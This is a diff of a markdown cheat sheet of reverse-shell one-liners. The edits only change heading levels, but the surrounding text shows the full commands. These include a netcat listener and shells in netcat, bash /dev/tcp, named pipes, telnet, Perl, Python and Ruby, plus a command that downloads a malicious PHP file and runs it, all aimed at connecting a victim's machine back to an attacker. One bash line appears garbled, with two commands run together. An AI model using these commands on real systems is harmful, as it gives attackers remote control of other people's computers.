@@ -10,32 +10,32 @@ Reverse shells can be used to execute commands or collect data from another comp
 
 It's important to consider what software the victim might have on their machine to enable this connection, thus using built in tools can be a smart approach.
 
-#### Here's how you start the listener to connect to the vicitm (using netcat):
+##### Here's how you start the listener to connect to the vicitm (using netcat):
 
 	attacker$ nc -l -v attackerip 4444
 
 
-#### Netcat
+##### Netcat
 
 	nc <attacker_ip> <port> -e /bin/bash
 
-#### no -e flag? use the GAPING_SECURITY_HOLE technique
+##### no -e flag? use the GAPING_SECURITY_HOLE technique
 
 	mknod backpipe p; nc <attacker_ip> <port> 0<backpipe | /bin/bash 1>backpipe
 
-#### /dev/tcp
+##### /dev/tcp
 
 	/bin/bash -i > /dev/tcp/<attacker_ip>/<port> 0<&1 2>&1
 
-#### Telnet - GAPING_SECURITY_HOLE
+##### Telnet - GAPING_SECURITY_HOLE
 
 	mknod backpipe p; telnet <attacker_ip> <port> 0<backpipe | /bin/bash 1>backpipe
 
-#### PHP
+##### PHP
 
 	wget -O /tmp/bd.php <url_to_malicious_file> && php -f /tmp/bd.php
 
-#### Bash
+##### Bash
 
 	bash -i >& /dev/tcp/10.0.0.1/8080 0>&10<&196;exec 196<>/dev/tcp/attackerip/4444;
 
@@ -47,19 +47,19 @@ It's important to consider what software the victim might have on their machine 
 
 	while read line 0<&5; do $line 2>&5 >&5; done
 
-#### PERL
+##### PERL
 
 	perl -MIO::Socket -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr => "127.0.0.1:1234");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
 
-#### Python
+##### Python
 
 	python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 
-#### Ruby
+##### Ruby
 
 	ruby -rsocket -e 'exit if fork;c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
 
-### Further Reading
+##### Further Reading
 
 [http://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html][1]
 
